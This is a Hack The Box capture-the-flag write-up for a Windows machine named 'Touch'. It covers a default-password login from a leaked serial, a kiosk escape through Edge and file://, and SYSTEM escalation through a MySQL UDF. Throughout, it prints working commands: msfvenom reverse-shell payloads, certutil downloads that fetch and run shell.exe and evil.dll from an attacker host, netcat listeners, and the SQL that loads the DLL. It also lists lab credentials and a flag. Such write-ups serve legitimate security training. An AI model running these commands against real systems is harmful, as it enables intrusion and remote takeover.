Touch

Medium

Windows

Exploited an unauthenticated DeviceHub API that leaked the device serial (used as the default password), extracted KioskUser credentials from the admin dashboard, escaped a locked-down RDP kiosk via an error dialog and Edge file:// protocol, then escalated to SYSTEM by loading a malicious MySQL UDF into a writable plugin directory.

Vulnerabilities
Information Disclosure Default Credentials Kiosk Escape MySQL UDF
Tools Used
nmap curl xfreerdp3 msfvenom

Summary

  • Discovered an unauthenticated DeviceHub API endpoint (/api/status) that leaked the device serial number NX-DH-2024-B7042.
  • Used the serial as the default admin password to authenticate to the Nexion DeviceHub management portal on port 8443.
  • Extracted clear-text KioskUser credentials (KioskUser:K!0sk2026#) from the dashboard and scanner pages.
  • Gained RDP access into a heavily restricted kiosk environment running the HTB Airways self-check-in application.
  • Remotely powered off the DocReader and Printer services, triggering an application error dialog whose support hyperlink launched Microsoft Edge.
  • Escaped the kiosk by navigating to file:///C:/Windows/System32/cmd.exe, obtaining a command prompt as KioskUser.
  • Established a reverse shell, retrieved the user flag, then escalated to SYSTEM by abusing a writable MySQL plugin directory and a plaintext root password found in a scheduled maintenance script.

Port Scan

Started with a full TCP service/version scan on the target.

$ nmap -sV -sC -p- --min-rate 1000 -T4 10.129.126.135

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Nexion DeviceHub - Login
Port Service Version
135 msrpc Microsoft Windows RPC
3389 ms-wbt-server Microsoft Terminal Service
5985 http Microsoft HTTPAPI 2.0 (WinRM)
8443 http Microsoft HTTPAPI 2.0 (DeviceHub)

Four open ports. Port 8443 hosts the primary attack surface — the Nexion DeviceHub management interface.

Web Enumeration

Port 8443 serves the Nexion DeviceHub login page:

$ curl -v http://10.129.126.135:8443/login

Page title: Nexion DocReader / DeviceHub DH-100 — Gate B7. A tooltip on the “Forgot your password?” link states:

The default password is the device serial number included in your DeviceHub packaging.

An unauthenticated status endpoint leaks the serial:

$ curl http://10.129.126.135:8443/api/status
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online",...}

DeviceHub Authentication

Authenticated using the leaked serial as the password:

$ curl -v -X POST http://10.129.126.135:8443/login \
  -d "password=NX-DH-2024-B7042" -c cookies.txt -L

Successful login sets the nxsession cookie and redirects to /dashboard.

Credential Exposure

The dashboard and scanner pages display clear-text credentials for the attached kiosk devices:

Username : KioskUser
Password : K!0sk2026#

These credentials are also shown (masked by default) under both the Passport Scanner and Boarding Pass Printer cards.

RDP Access

Used the recovered credentials to obtain an RDP session:

$ xfreerdp3 /v:10.129.126.135 /u:KioskUser /p:'K!0sk2026#' /clipboard /cert:ignore

The session lands inside a locked-down kiosk running the HTB Airways self-check-in application. There is no normal desktop, no taskbar and no Start menu. Booking lookup succeeds with the credentials recovered from the previous machine “Layover”:

Booking Ref : KS7X2M
Last Name   : CRAWFORD

Kiosk Escape

From the attacker’s browser (still authenticated to DeviceHub) the DocReader and Printer services were powered off:

$ curl -b cookies.txt -X POST http://10.129.126.135:8443/api/scanner/power \
  -H "Content-Type: application/json" -d '{"powered":false}'

$ curl -b cookies.txt -X POST http://10.129.126.135:8443/api/printer/power \
  -H "Content-Type: application/json" -d '{"powered":false}'

Inside the RDP kiosk any action that contacts the now-offline DocReader service (e.g. Staff Login or Scan Passport) produces an error dialog:

Nexion DocReader SR-4200 has stopped responding.
Error Code: SCN-ERR-4092
Device: NX-SR-2024-0042
Contact your system administrator or visit the support page for troubleshooting steps.
https://support.nexionsystems.com/docreader/troubleshoot

Clicking the support hyperlink opens Microsoft Edge. In the address bar:

file:///C:/Windows/System32/cmd.exe

Edge treats the path as a download. Opening the file launches cmd.exe as KioskUser, escaping the kiosk restrictions.

Reverse Shell

On Kali a reverse-shell executable was generated and hosted:

$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.191 LPORT=443 -f exe -o shell.exe
$ python3 -m http.server 80
$ nc -lvnp 443

On the target the payload was downloaded and executed:

C:\Users\KioskUser\Downloads> certutil -urlcache -split -f http://10.10.15.191/shell.exe C:\Users\KioskUser\Downloads\shell.exe
C:\Users\KioskUser\Downloads> C:\Users\KioskUser\Downloads\shell.exe

A stable reverse shell was obtained as kiosk-042\kioskuser.

User Flag

C:\Users\KioskUser\Desktop> type user.txt
4c5c48bce9dd50c18bf06f5f331094a5

Privilege Escalation — MySQL UDF

Enumeration

Group membership included KIOSK-042\Printer Administrators. Local listening services revealed MySQL on 127.0.0.1:3306.

C:\> icacls "C:\MySQL\bin"
C:\> icacls "C:\MySQL\lib\plugin"

Both directories are writable by NT AUTHORITY\Authenticated Users. The MySQL service runs as NT AUTHORITY\SYSTEM.

Credential Discovery

A scheduled maintenance script contained the MySQL root password in clear text:

C:\> type "C:\ProgramData\HTB Airways\refresh-dates.bat"
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul

MySQL root password: HTB@irw4ys_DB!2026

Malicious UDF

On Kali a DLL payload was generated on a second port:

$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.191 LPORT=5555 -f dll -o evil.dll
$ python3 -m http.server 80
$ nc -lvnp 5555

On the target the DLL was placed in the writable plugin directory and registered:

C:\> certutil -urlcache -split -f http://10.10.15.191/evil.dll C:\MySQL\lib\plugin\evil.dll
C:\> C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_exec RETURNS INT SONAME 'evil.dll';"

MySQL loaded the DLL under the SYSTEM account, delivering a reverse shell as NT AUTHORITY\SYSTEM.

Key Takeaways

  • Unauthenticated device-management APIs that leak serial numbers turn default-password schemes into free authentication.
  • Administrative panels should never display end-user or service credentials in plaintext — the DeviceHub dashboard exposed KioskUser credentials to anyone who logged in with the serial.
  • Kiosk lockdown is only as strong as the least-restricted application that can be launched from an error dialog; the support hyperlink provided a path to unrestricted Edge.
  • file:// protocol handling inside a kiosk browser remains a classic and reliable escape path.
  • Database service accounts should never run as LocalSystem; a writable plugin directory combined with SYSTEM privileges is a direct code-execution vector.
  • Secrets stored in clear text inside scheduled scripts are trivial to recover and frequently complete the privilege-escalation chain when paired with a writable code-execution path.
